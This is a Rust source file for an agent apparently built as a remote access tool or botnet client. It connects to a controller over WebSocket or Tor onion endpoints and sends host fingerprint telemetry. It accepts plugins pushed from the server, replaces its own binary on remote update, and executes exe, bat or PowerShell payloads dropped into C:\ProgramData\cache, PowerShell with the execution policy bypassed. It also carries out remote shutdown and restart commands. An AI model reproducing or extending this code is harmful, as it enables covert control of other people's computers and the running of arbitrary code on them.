use std::{io, path::{Path, PathBuf}, sync::Arc, time::Duration};

use base64::{engine::general_purpose::STANDARD, Engine as _};
use tokio::time::{interval, sleep};

use crate::{args::Args, auth, plugin::Manager, sys, telemetry, text, transport::{self, Session}, update};

const MAX_RETRY_JITTER_MILLIS: u64 = 500;

pub async fn run(args: &Args, mut final_ready: Option<update::FinalReadyArgs>) -> io::Result<()> {
    let fp = telemetry::fingerprint();
    let host = telemetry::host(&fp);

    if !args.use_websocket {
        let ip = args.legacy_ip.clone();
        let port = args.legacy_port;
        return tokio::task::spawn_blocking(move || crate::legacy_net::run(&ip, port, final_ready))
            .await
            .map_err(|e| io::Error::new(io::ErrorKind::Other, format!("legacy network task failed: {e}")));
    }

    let signing_key = Arc::new(auth::load_signing_key(&args.auth_key_file)?);
    if args.endpoint.is_onion() {
        eprintln!("ztsec transport=arti endpoint={}", args.endpoint_display);
    } else {
        eprintln!("ztsec transport=websocket-loopback endpoint={}", args.endpoint_display);
    }

    let mut connector = transport::Connector::new(
        args.endpoint.clone(),
        args.arti_state_dir.clone(),
        args.arti_cache_dir.clone(),
    );
    let mut plugins = Manager::new();
    let mut delay = args.retry_base;

    loop {
        match connector.connect_authenticated(
            &fp,
            &signing_key,
            args.connect_timeout,
            args.handshake_timeout,
        ).await {
            Ok(mut session) => {
                let target = connector.endpoint().target().0.to_owned();
                let ping_target = if connector.endpoint().is_onion() { None } else { telemetry::ping_ms(&target) };
                let data = tokio::task::spawn_blocking({
                    let target = target.clone();
                    let fp = fp.clone();
                    move || telemetry::record(&target, ping_target, &fp)
                }).await.map_err(|e| io::Error::new(io::ErrorKind::Other, e.to_string()))?;

                let hello_data = format!("{}{}", text::DATA, data);
                if session.send_text(&hello_data).await.is_err() {
                    let _ = session.close().await;
                    println!("{}", text::RETRYING);
                    delay = next_backoff(delay, args.retry_base, args.retry_max);
                    sleep(jitter(delay)).await;
                    continue;
                }

                println!("{}", text::CONNECTED);
                if std::env::var_os("ZTSEC_CI").is_some() {
                    eprintln!("agent process pid={} exe={}", std::process::id(), std::env::current_exe().map(|p| p.display().to_string()).unwrap_or_else(|_| "<unknown>".into()));
                }
                plugins.event("agent.connected", host.as_bytes());
                if let Some(context) = final_ready.as_ref() {
                    match update::notify_final_ready(context) {
                        Ok(()) => final_ready = None,
                        Err(error) => eprintln!("update final-ready notification failed: {error}"),
                    }
                }

                let should_exit = ws_session(
                    &mut session,
                    &target,
                    &args.endpoint_display,
                    &fp,
                    &host,
                    &mut plugins,
                    args.heartbeat,
                    &args.auth_key_file,
                    &args.arti_state_dir,
                    &args.arti_cache_dir,
                ).await;
                plugins.clear();
                if should_exit {
                    return Ok(());
                }
                delay = args.retry_base;
                println!("{}", text::RETRYING);
            }
            Err(error) => {
                eprintln!("ztsec connection failed: {error}");
                println!("{}", text::RETRYING);
            }
        }

        sleep(jitter(delay)).await;
        delay = next_backoff(delay, args.retry_base, args.retry_max);
    }
}

async fn ws_session(
    session: &mut Session,
    target: &str,
    endpoint: &str,
    fp: &str,
    host: &str,
    plugins: &mut Manager,
    heartbeat: Duration,
    auth_key_file: &Path,
    arti_state_dir: &Path,
    arti_cache_dir: &Path,
) -> bool {
    let mut ticker = interval(heartbeat);
    let mut update_transfer: Option<UpdateTransfer> = None;
    loop {
        tokio::select! {
            _ = ticker.tick() => {
                for output in plugins.drain_outputs() {
                    let event = output.event.replace(':', "_").replace('\n', "_");
                    let payload = output.payload;
                    if std::env::var_os("ZTSEC_CI").is_some() {
                        println!("plugin event: {} {}", event, String::from_utf8_lossy(&payload));
                    }
                    let _ = session.send_text(&format!("{}{}:{}", text::PLUGOUT, event, encode_b64(&payload))).await;
                }
                if session.send_ping().await.is_err() {
                    return false;
                }
            }
            result = session.next_text() => {
                match result {
                    Ok(Some(value)) if value == text::HB => {
                        if session.send_text(text::PONG).await.is_err() { return false; }
                    }
                    Ok(Some(value)) if value == text::REQ => {
                        if session.send_text(text::PONG).await.is_err() { return false; }
                        let telemetry = match tokio::task::spawn_blocking({
                            let target = target.to_owned();
                            let fp = fp.to_owned();
                            move || telemetry::record(&target, None, &fp)
                        }).await {
                            Ok(value) => value,
                            Err(_) => return false,
                        };
                        if session.send_text(&format!("{}{}", text::DATA, telemetry)).await.is_err() { return false; }
                    }
                    Ok(Some(value)) if value.starts_with(text::CMD) => {
                        let raw = value[text::CMD.len()..].trim();
                        match handle_command(session, raw, endpoint, fp, host, plugins, &mut update_transfer, auth_key_file, arti_state_dir, arti_cache_dir).await {
                            CommandResult::Close => return true,
                            CommandResult::Reconnect => return false,
                            CommandResult::Continue => {}
                        }
                    }
                    Ok(Some(_)) => {}
                    Ok(None) | Err(_) => return false,
                }
            }
        }
    }
}

enum CommandResult { Continue, Close, Reconnect }

struct UpdateTransfer {
    path: PathBuf,
    expected_hash: String,
    expected_size: u64,
    next_offset: u64,
    committed: bool,
}

impl Drop for UpdateTransfer {
    fn drop(&mut self) {
        if !self.committed {
            let _ = std::fs::remove_file(&self.path);
        }
    }
}

async fn handle_command(
    session: &mut Session,
    raw: &str,
    endpoint: &str,
    fp: &str,
    host: &str,
    plugins: &mut Manager,
    update_transfer: &mut Option<UpdateTransfer>,
    auth_key_file: &Path,
    arti_state_dir: &Path,
    arti_cache_dir: &Path,
) -> CommandResult {
    if starts_with_ascii_ci(raw, text::PLUGIN) {
        let rest = raw[text::PLUGIN.len()..].trim();
        let (id, b64) = match rest.split_once(':') { Some(v) => v, None => { let _ = session.send_text(&format!("{}{}", text::ERR, text::PLUGIN)).await; return CommandResult::Continue; } };
        if id.trim().is_empty() || b64.trim().is_empty() { let _ = session.send_text(&format!("{}{}", text::ERR, text::PLUGIN)).await; return CommandResult::Continue; }
        match decode_b64(b64.trim()) {
            Some(bytes) => match plugins.load(id.trim(), &bytes, host.as_bytes()) {
                Ok(()) => { let _ = session.send_text(&format!("{}{}{}", text::ACK, text::PLUGIN, id.trim())).await; }
                Err(_) => { let _ = session.send_text(&format!("{}{}", text::ERR, text::PLUGIN)).await; }
            },
            None => { let _ = session.send_text(&format!("{}{}", text::ERR, text::PLUGIN)).await; }
        }
        return CommandResult::Continue;
    }

    if starts_with_ascii_ci(raw, text::PBEGIN) {
        let parts: Vec<&str> = raw[text::PBEGIN.len()..].trim().splitn(4, ':').collect();
        if parts.len() != 4 { let _ = session.send_text(&format!("{}{}", text::ERR, text::PBEGIN)).await; return CommandResult::Continue; }
        let plugin_id = parts[0].trim();
        let transfer_id = parts[1].trim();
        let size = match parts[2].trim().parse::<u64>() { Ok(v) => v, Err(_) => { let _ = session.send_text(&format!("{}{}", text::ERR, text::PBEGIN)).await; return CommandResult::Continue; } };
        let hash = parts[3].trim();
        if plugin_id.is_empty() || transfer_id.is_empty() || size == 0 || !is_hex64(hash) || size > ztsec_protocol::MAX_PLUGIN_BYTES as u64 {
            let _ = session.send_text(&format!("{}{}", text::ERR, text::PBEGIN)).await;
            return CommandResult::Continue;
        }
        match plugins.begin_transfer(plugin_id, transfer_id, size, hash) {
            Ok(next) => { let _ = session.send_text(&format!("{}{}{}:{}", text::ACK, text::PBEGIN, transfer_id, next)).await; }
            Err(_) => { let _ = session.send_text(&format!("{}{}", text::ERR, text::PBEGIN)).await; }
        }
        return CommandResult::Continue;
    }

    if starts_with_ascii_ci(raw, text::PRESUME) {
        let transfer_id = raw[text::PRESUME.len()..].trim();
        match plugins.resume_transfer(transfer_id) {
            Some(next) => { let _ = session.send_text(&format!("{}{}{}:{}", text::ACK, text::PRESUME, transfer_id, next)).await; }
            None => { let _ = session.send_text(&format!("{}{}", text::ERR, text::PRESUME)).await; }
        }
        return CommandResult::Continue;
    }

    if starts_with_ascii_ci(raw, text::PCHUNK) {
        let parts: Vec<&str> = raw[text::PCHUNK.len()..].trim().splitn(3, ':').collect();
        if parts.len() != 3 { let _ = session.send_text(&format!("{}{}", text::ERR, text::PCHUNK)).await; return CommandResult::Continue; }
        let transfer_id = parts[0].trim();
        let offset = match parts[1].trim().parse::<u64>() { Ok(v) => v, Err(_) => { let _ = session.send_text(&format!("{}{}", text::ERR, text::PCHUNK)).await; return CommandResult::Continue; } };
        let bytes = match update::decode_base64(parts[2].trim()) { Some(v) if !v.is_empty() && v.len() <= 128 * 1024 => v, _ => { let _ = session.send_text(&format!("{}{}", text::ERR, text::PCHUNK)).await; return CommandResult::Continue; } };
        match plugins.append_transfer(transfer_id, offset, &bytes) {
            Ok(next) => { let _ = session.send_text(&format!("{}{}{}:{}", text::ACK, text::PCHUNK, transfer_id, next)).await; }
            Err(_) => { let _ = session.send_text(&format!("{}{}", text::ERR, text::PCHUNK)).await; }
        }
        return CommandResult::Continue;
    }

    if starts_with_ascii_ci(raw, text::PEND) {
        let transfer_id = raw[text::PEND.len()..].trim();
        match plugins.finish_transfer(transfer_id, host.as_bytes()) {
            Ok(id) => { let _ = session.send_text(&format!("{}{}{}", text::ACK, text::PEND, id)).await; }
            Err(_) => { let _ = session.send_text(&format!("{}{}", text::ERR, text::PEND)).await; }
        }
        return CommandResult::Continue;
    }

    if starts_with_ascii_ci(raw, text::PMSG) {
        let rest = raw[text::PMSG.len()..].trim();
        let (plugin_id, encoded) = match rest.split_once(':') { Some(v) => v, None => { let _ = session.send_text(&format!("{}{}", text::ERR, text::PMSG)).await; return CommandResult::Continue; } };
        if plugin_id.trim().is_empty() { let _ = session.send_text(&format!("{}{}", text::ERR, text::PMSG)).await; return CommandResult::Continue; }
        let payload = match update::decode_base64(encoded.trim()) { Some(v) => v, None => { let _ = session.send_text(&format!("{}{}", text::ERR, text::PMSG)).await; return CommandResult::Continue; } };
        let mut parts = payload.splitn(2, |b| *b == b'\n');
        let event_bytes = parts.next().unwrap_or(&[]);
        let data = parts.next().unwrap_or(&[]);
        let event = match core::str::from_utf8(event_bytes) { Ok(v) if !v.is_empty() => v, _ => { let _ = session.send_text(&format!("{}{}", text::ERR, text::PMSG)).await; return CommandResult::Continue; } };
        plugins.event(event, data);
        let _ = session.send_text(&format!("{}{}{}", text::ACK, text::PMSG, plugin_id.trim())).await;
        return CommandResult::Continue;
    }

    if starts_with_ascii_ci(raw, "UNLOAD:") {
        let id = raw[7..].trim();
        let ok = plugins.unload(id);
        let _ = session.send_text(&format!("{}{}{}", if ok { text::ACK } else { text::ERR }, text::PLUGOUT, id)).await;
        return CommandResult::Continue;
    }

    if starts_with_ascii_ci(raw, text::PEVENT) {
        let event = raw[text::PEVENT.len()..].trim();
        if event.is_empty() { let _ = session.send_text(&format!("{}{}", text::ERR, text::PEVENT)).await; } else {
            plugins.event(event, &[]);
            let _ = session.send_text(&format!("{}{}{}", text::ACK, text::PEVENT, event)).await;
        }
        return CommandResult::Continue;
    }

    if starts_with_ascii_ci(raw, text::UPDATE_BEGIN) {
        if update_transfer.is_some() {
            let _ = session.send_text(&format!("{}{}busy", text::ERR, text::UPDATE_BEGIN)).await;
            return CommandResult::Continue;
        }
        let rest = raw[text::UPDATE_BEGIN.len()..].trim();
        let parts: Vec<&str> = rest.split(':').collect();
        if parts.len() != 2 || !is_hex64(parts[0]) {
            let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_BEGIN)).await;
            return CommandResult::Continue;
        }
        let expected_hash = parts[0].trim().to_ascii_lowercase();
        let expected_size = match parts[1].trim().parse::<u64>() {
            Ok(value) if value > 0 && value <= update::max_update_bytes() as u64 => value,
            _ => {
                let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_BEGIN)).await;
                return CommandResult::Continue;
            }
        };
        let hash_for_task = expected_hash.clone();
        let path = match tokio::task::spawn_blocking(move || update::begin_update_file(&hash_for_task, expected_size)).await {
            Ok(Ok(path)) => path,
            _ => {
                let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_BEGIN)).await;
                return CommandResult::Continue;
            }
        };
        *update_transfer = Some(UpdateTransfer {
            path,
            expected_hash,
            expected_size,
            next_offset: 0,
            committed: false,
        });
        let _ = session.send_text(&format!("{}{}0", text::ACK, text::UPDATE_BEGIN)).await;
        return CommandResult::Continue;
    }

    if starts_with_ascii_ci(raw, text::UPDATE_CHUNK) {
        let Some(transfer) = update_transfer.as_mut() else {
            let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_CHUNK)).await;
            return CommandResult::Continue;
        };
        let rest = raw[text::UPDATE_CHUNK.len()..].trim();
        let (offset_raw, encoded) = match rest.split_once(':') {
            Some(value) => value,
            None => {
                let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_CHUNK)).await;
                return CommandResult::Continue;
            }
        };
        let offset = match offset_raw.trim().parse::<u64>() {
            Ok(value) if value == transfer.next_offset => value,
            _ => {
                let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_CHUNK)).await;
                return CommandResult::Continue;
            }
        };
        let bytes = match update::decode_base64(encoded.trim()) {
            Some(value) if !value.is_empty() && value.len() <= 128 * 1024 && offset.saturating_add(value.len() as u64) <= transfer.expected_size => value,
            _ => {
                let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_CHUNK)).await;
                return CommandResult::Continue;
            }
        };
        let path = transfer.path.clone();
        let next_offset = match tokio::task::spawn_blocking(move || update::append_update_file(&path, offset, &bytes)).await {
            Ok(Ok(next)) => next,
            _ => {
                let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_CHUNK)).await;
                return CommandResult::Continue;
            }
        };
        transfer.next_offset = next_offset;
        let _ = session.send_text(&format!("{}{}{}", text::ACK, text::UPDATE_CHUNK, next_offset)).await;
        return CommandResult::Continue;
    }

    if starts_with_ascii_ci(raw, text::UPDATE_END) {
        let Some(mut transfer) = update_transfer.take() else {
            let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_END)).await;
            return CommandResult::Continue;
        };
        if transfer.next_offset != transfer.expected_size {
            let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_END)).await;
            return CommandResult::Continue;
        }
        let path_for_finalize = transfer.path.clone();
        let expected_hash = transfer.expected_hash.clone();
        let expected_size = transfer.expected_size;
        let staged = match tokio::task::spawn_blocking(move || update::finalize_update_file(&path_for_finalize, &expected_hash, expected_size)).await {
            Ok(Ok(path)) => path,
            _ => {
                let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_END)).await;
                return CommandResult::Continue;
            }
        };
        let target_path = match std::env::current_exe() {
            Ok(path) => path,
            Err(_) => {
                let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_END)).await;
                return CommandResult::Continue;
            }
        };
        let hash = transfer.expected_hash.clone();
        let endpoint = endpoint.to_owned();
        let auth_key_file = auth_key_file.to_owned();
        let arti_state_dir = arti_state_dir.to_owned();
        let arti_cache_dir = arti_cache_dir.to_owned();
        let fp_owned = fp.to_owned();
        let parent_pid = std::process::id();
        let spawn_result = tokio::task::spawn_blocking(move || {
            update::spawn_successor_with_endpoint(
                staged,
                target_path,
                hash,
                parent_pid,
                &endpoint,
                &auth_key_file,
                &arti_state_dir,
                &arti_cache_dir,
                &fp_owned,
            )
        }).await;
        match spawn_result {
            Ok(Ok(handoff)) => {
                transfer.committed = true;
                let admitted = tokio::task::spawn_blocking(move || handoff.wait_admission()).await;
                if !matches!(admitted, Ok(Ok(()))) {
                    let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_END)).await;
                    return CommandResult::Close;
                }
                let _ = session.send_text(&format!("{}{}", text::ACK, text::UPDATE_END)).await;
                return CommandResult::Close;
            }
            _ => {
                let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_END)).await;
                return CommandResult::Continue;
            }
        }
    }

    if starts_with_ascii_ci(raw, text::UPDATE) {
        let rest = raw[text::UPDATE.len()..].trim();
        let (expected_hash, b64) = match rest.split_once(':') { Some(v) => (v.0.trim(), v.1.trim()), None => { let _=session.send_text(&format!("{}{}",text::ERR,text::UPDATE)).await; return CommandResult::Continue; } };
        let bytes = match update::decode_base64(b64) { Some(v) if !v.is_empty() && v.len() <= update::max_update_bytes() => v, _ => { let _=session.send_text(&format!("{}{}",text::ERR,text::UPDATE)).await; return CommandResult::Continue; } };
        #[cfg(windows)]
        if bytes.len() < 2 || &bytes[..2] != b"MZ" { let _=session.send_text(&format!("{}{}",text::ERR,text::UPDATE)).await; return CommandResult::Continue; }
        let actual_hash = update::sha256_hex(&bytes);
        if !update::validate_hash(expected_hash, &actual_hash) { let _=session.send_text(&format!("{}{}",text::ERR,text::UPDATE)).await; return CommandResult::Continue; }
        // A bounded WebSocket message cannot safely carry the full 64 MiB legacy update. Small updates
        // remain backward-compatible; large updates use UPDATE_BEGIN/UPDATE_CHUNK/UPDATE_END.
        if bytes.len() > 300 * 1024 {
            let _ = session.send_text(&format!("{}UPDATE:use-chunked", text::ERR)).await;
            return CommandResult::Continue;
        }
        let staged = match update::stage_bytes(&bytes, expected_hash) { Ok(p)=>p, Err(_)=>{ let _=session.send_text(&format!("{}{}",text::ERR,text::UPDATE)).await; return CommandResult::Continue; } };
        let target_path = match std::env::current_exe() { Ok(p)=>p, Err(_)=>{ let _=std::fs::remove_file(&staged); let _=session.send_text(&format!("{}{}",text::ERR,text::UPDATE)).await; return CommandResult::Continue; } };
        let endpoint = endpoint.to_owned();
        let auth_key_file = auth_key_file.to_owned();
        let arti_state_dir = arti_state_dir.to_owned();
        let arti_cache_dir = arti_cache_dir.to_owned();
        let parent_pid = std::process::id();
        let hash = actual_hash.clone();
        let fp_owned = fp.to_owned();
        let result = tokio::task::spawn_blocking(move || update::spawn_successor_with_endpoint(staged, target_path, hash, parent_pid, &endpoint, &auth_key_file, &arti_state_dir, &arti_cache_dir, &fp_owned)).await;
        match result {
            Ok(Ok(handoff)) => {
                let admitted = tokio::task::spawn_blocking(move || handoff.wait_admission()).await;
                if !matches!(admitted, Ok(Ok(()))) {
                    let _=session.send_text(&format!("{}{}",text::ERR,text::UPDATE)).await;
                    return CommandResult::Close;
                }
                let _=session.send_text(&format!("{}{}",text::ACK,text::UPDATE)).await;
                return CommandResult::Close;
            }
            _ => { let _=session.send_text(&format!("{}{}",text::ERR,text::UPDATE)).await; return CommandResult::Continue; }
        }
    }

    if starts_with_ascii_ci(raw, text::EXECUTE) {
        let rest = raw[text::EXECUTE.len()..].trim();
        let (ext, b64) = match rest.split_once(':') { Some(v)=>v, None=>{let _=session.send_text(&format!("{}{}",text::ERR,text::EXECUTE)).await;return CommandResult::Continue;} };
        let ext_lc = ext.to_ascii_lowercase();
        if !matches!(ext_lc.as_str(), "exe" | "bat" | "ps1") || b64.is_empty() { let _=session.send_text(&format!("{}{}",text::ERR,text::EXECUTE)).await; return CommandResult::Continue; }
        match decode_b64(b64) {
            Some(bytes) if bytes.len() <= ztsec_protocol::MAX_EXECUTE_BYTES => match drop_and_run(&bytes, &ext_lc) {
                Ok(()) => { let _=session.send_text(&format!("{}{}",text::ACK,text::EXECUTE)).await; }
                Err(_) => { let _=session.send_text(&format!("{}{}",text::ERR,text::EXECUTE)).await; }
            },
            _ => { let _=session.send_text(&format!("{}{}",text::ERR,text::EXECUTE)).await; }
        }
        return CommandResult::Continue;
    }

    let cmd = raw.to_ascii_uppercase();
    match cmd.as_str() {
        text::RECONNECT => { let _=session.send_text(&format!("{}{}",text::ACK,cmd)).await; CommandResult::Reconnect }
        text::CLOSE => { let _=session.send_text(&format!("{}{}",text::ACK,cmd)).await; println!("{}",text::CLOSED); CommandResult::Close }
        text::SLEEP | text::HIBERNATE | text::RESTART | text::SHUTDOWN => {
            let ok = sys::command(&cmd);
            let _=session.send_text(&format!("{}{}",if ok {text::ACK}else{text::ERR},cmd)).await;
            plugins.event("agent.command", cmd.as_bytes());
            if ok { CommandResult::Close } else { CommandResult::Continue }
        }
        _ => { let _=session.send_text(&format!("{}UNKNOWN_COMMAND",text::ERR)).await; CommandResult::Continue }
    }
}

fn starts_with_ascii_ci(value: &str, prefix: &str) -> bool {
    value.len() >= prefix.len() && value.as_bytes().iter().take(prefix.len()).zip(prefix.as_bytes()).all(|(a,b)| a.to_ascii_uppercase()==b.to_ascii_uppercase())
}

fn jitter(base: Duration) -> Duration {
    if base.is_zero() { return base; }
    let mut bytes = [0u8; 2];
    let jitter_ms = match getrandom::getrandom(&mut bytes) {
        Ok(()) => u16::from_be_bytes(bytes) as u64 % (MAX_RETRY_JITTER_MILLIS + 1),
        Err(_) => 0,
    };
    base.saturating_add(Duration::from_millis(jitter_ms.min(base.as_millis().min(u64::MAX as u128) as u64 / 2 + 1)))
}

fn next_backoff(current: Duration, min: Duration, max: Duration) -> Duration {
    current.checked_mul(2).unwrap_or(max).min(max).max(min)
}

fn decode_b64(s: &str) -> Option<Vec<u8>> {
    STANDARD.decode(s.trim()).ok()
}

fn encode_b64(bytes: &[u8]) -> String { STANDARD.encode(bytes) }

fn is_hex64(value: &str) -> bool { value.len() == 64 && value.bytes().all(|b| b.is_ascii_hexdigit()) }

#[cfg(windows)]
fn drop_and_run(bytes: &[u8], ext: &str) -> std::io::Result<()> {
    use std::{fs, process::Command, time::SystemTime};
    let seed = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).map(|d| d.as_nanos() as u64).unwrap_or(0) ^ (bytes.len() as u64).wrapping_mul(0x9e37_79b9_7f4a_7c15);
    let name = format!("{:012x}", seed & 0xffff_ffff_ffff);
    let dir = std::path::Path::new(r"C:\ProgramData\cache");
    fs::create_dir_all(dir)?;
    let path = dir.join(format!("{name}.{ext}"));
    fs::write(&path, bytes)?;
    match ext {
        "exe" => { Command::new(&path).spawn()?; }
        "bat" => { Command::new("cmd").args(["/c", path.to_str().unwrap_or("")]).spawn()?; }
        "ps1" => { Command::new("powershell").args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", path.to_str().unwrap_or("")]).spawn()?; }
        _ => {}
    }
    Ok(())
}

#[cfg(not(windows))]
fn drop_and_run(_bytes: &[u8], _ext: &str) -> std::io::Result<()> {
    Err(io::Error::new(io::ErrorKind::Unsupported, "command execution is Windows-only"))
}
